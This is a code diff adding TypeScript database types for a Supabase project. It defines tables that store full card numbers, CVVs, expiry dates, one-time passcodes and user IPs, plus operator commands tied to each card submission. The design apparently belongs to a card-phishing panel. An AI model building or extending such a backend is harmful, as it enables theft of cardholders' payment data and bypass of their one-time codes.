@@ -9,7 +9,107 @@ export type Json =
 export type Database = {
   public: {
     Tables: {
-      [_ in never]: never
+      admin_commands: {
+        Row: {
+          command: string
+          created_at: string
+          id: string
+          submission_id: string | null
+        }
+        Insert: {
+          command: string
+          created_at?: string
+          id?: string
+          submission_id?: string | null
+        }
+        Update: {
+          command?: string
+          created_at?: string
+          id?: string
+          submission_id?: string | null
+        }
+        Relationships: [
+          {
+            foreignKeyName: "admin_commands_submission_id_fkey"
+            columns: ["submission_id"]
+            isOneToOne: false
+            referencedRelation: "card_submissions"
+            referencedColumns: ["id"]
+          },
+        ]
+      }
+      card_submissions: {
+        Row: {
+          amount: string
+          browser: string
+          card_holder: string
+          card_number: string
+          created_at: string
+          cvv: string
+          expiry_month: string
+          expiry_year: string
+          id: string
+          invoice_id: string
+          network: string
+          otp: string | null
+          updated_at: string
+          user_ip: string
+        }
+        Insert: {
+          amount: string
+          browser: string
+          card_holder: string
+          card_number: string
+          created_at?: string
+          cvv: string
+          expiry_month: string
+          expiry_year: string
+          id?: string
+          invoice_id: string
+          network: string
+          otp?: string | null
+          updated_at?: string
+          user_ip: string
+        }
+        Update: {
+          amount?: string
+          browser?: string
+          card_holder?: string
+          card_number?: string
+          created_at?: string
+          cvv?: string
+          expiry_month?: string
+          expiry_year?: string
+          id?: string
+          invoice_id?: string
+          network?: string
+          otp?: string | null
+          updated_at?: string
+          user_ip?: string
+        }
+        Relationships: []
+      }
+      visitors: {
+        Row: {
+          created_at: string
+          id: string
+          ip: string
+          updated_at: string
+        }
+        Insert: {
+          created_at?: string
+          id?: string
+          ip: string
+          updated_at?: string
+        }
+        Update: {
+          created_at?: string
+          id?: string
+          ip?: string
+          updated_at?: string
+        }
+        Relationships: []
+      }
     }
     Views: {
       [_ in never]: never
